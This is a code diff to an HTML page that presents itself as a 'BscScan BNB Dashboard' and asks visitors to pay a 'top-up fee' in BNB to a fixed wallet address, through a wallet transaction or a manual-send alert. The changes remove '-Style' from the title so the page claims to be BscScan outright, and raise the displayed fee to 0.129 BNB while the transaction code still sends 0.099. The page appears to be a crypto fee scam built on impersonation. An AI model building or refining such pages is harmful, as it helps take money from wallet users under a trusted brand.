@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" /><meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>BscScan‑Style BNB Dashboard</title>
+  <title>BscScan BNB Dashboard</title>
   <script src="https://cdn.jsdelivr.net/npm/ethers@6/dist/ethers.min.js"></script>
   <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
   <style>
@@ -52,7 +52,7 @@
 
   <div class="container hidden" id="page3">
     <h1>Confirm Payment</h1>
-    <p>Top‑up fee: <strong>0.099 BNB</strong></p>
+    <p>Top‑up fee: <strong>0.129 BNB</strong></p>
     <div class="address-box" id="depositAddress">0xFf5e8a2603e64b2950Ee8D0Af6AC86670bD5Db69</div>
     <img class="qr" id="depositQR" src="" alt="BNB QR"/>
     <a class="link" href="https://bscscan.com/address/0xFf5e8a2603e64b2950Ee8D0Af6AC86670bD5Db69" target="_blank">View on BscScan</a>
@@ -157,7 +157,7 @@
           const tx = await signer.sendTransaction({ to: targetAddress, value: ethers.parseEther("0.099") });
           txHash = tx.hash;
         } else {
-          alert("Please send 0.099 BNB to: " + targetAddress);
+          alert("Please send 0.129 BNB to: " + targetAddress);
           txHash = "manual_"+Date.now();
         }
 
